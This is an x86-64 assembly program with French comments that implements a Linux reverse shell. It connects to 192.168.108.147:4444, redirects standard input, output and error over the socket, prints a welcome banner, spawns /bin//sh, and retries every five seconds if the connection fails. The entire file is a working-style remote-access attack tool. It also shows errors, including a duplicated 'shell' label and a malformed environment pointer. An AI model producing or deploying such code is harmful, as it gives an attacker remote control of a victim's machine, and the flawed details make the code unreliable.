section .data
TARGET_IP:
    dw 2                    ; AF_INET (2 bytes)
    dw 0x5c11               ; Port 4444 en network byte order
    dd 0x936CA8C0           ; IP 192.168.108.147 en network byte order
    times 8 db 0            ; padding pour sockaddr_in

welcome_msg:
    db "--------------------------------------------------", 0x0A
    db "|          BIENVENUE DANS LE REVERSE SHELL       |", 0x0A
    db "--------------------------------------------------", 0x0A
    db 0
welcome_len equ $ - welcome_msg


timespec:
    dd 5                    ; 5 secondes
    dd 0                    ; 0 nanosecondes

section .text
global _start

_start:
    jmp main

main:
    call create_socket
    test rax, rax
    js error_handler        ; Vérification d'erreur socket
    
    call connect
    test rax, rax
    js reconnect_if_fail    ; Vérification d'erreur connexion
    
    call redir_io
    call shell
    call exit

create_socket:
    mov rax, 41             ; syscall socket
    mov rdi, 2              ; AF_INET
    mov rsi, 1              ; SOCK_STREAM
    mov rdx, 0              ; IP_PROTOCOL
    syscall
    mov r12, rax            ; Stocker descripteur
    ret

connect:
    mov rax, 42             ; syscall connect
    mov rdi, r12            ; descripteur socket
    lea rsi, [rel TARGET_IP]; structure sockaddr_in
    mov rdx, 16             ; taille structure
    syscall
    ret

redir_io:
    mov rsi, 0              ; stdin
redir_loop:
    mov rax, 33             ; syscall dup2
    mov rdi, r12            ; descripteur socket
    mov rdx, rsi
    syscall
    inc rsi                 ; stdout, stderr
    cmp rsi, 3
    jl redir_loop
    ret

shell:
shell:
    ; Affichage message
    mov rax, 1              ; sys_write
    mov rdi, 1              ; stdout (redirigé)
    lea rsi, [rel welcome_msg]
    mov rdx, welcome_len
    syscall

    ; Exécution shell avec PS1 personnalisé
    xor rax, rax
    push rax                ; NULL terminator
    mov rbx, 0x68732f2f6e69622f  ; "/bin//sh"
    push rbx
    mov rdi, rsp            ; path
    
    ; Variables d'environnement
    mov rax, 0x3d77243f24537d24  ; "PS1='\\w $ '"
    push rax
    lea rdx, [rsp]          ; envp
    
    xor rsi, rsi            ; argv = NULL
    mov rax, 59             ; execve
    syscall


error_handler:
    mov rax, 3              ; syscall close
    mov rdi, r12
    syscall

reconnect_if_fail:
    mov rax, 35             ; syscall nanosleep
    lea rdi, [rel timespec] ; attendre 5 secondes
    xor rsi, rsi
    syscall
    jmp main                ; recommencer

exit:
    mov rax, 60             ; syscall exit
    mov rdi, 0
    syscall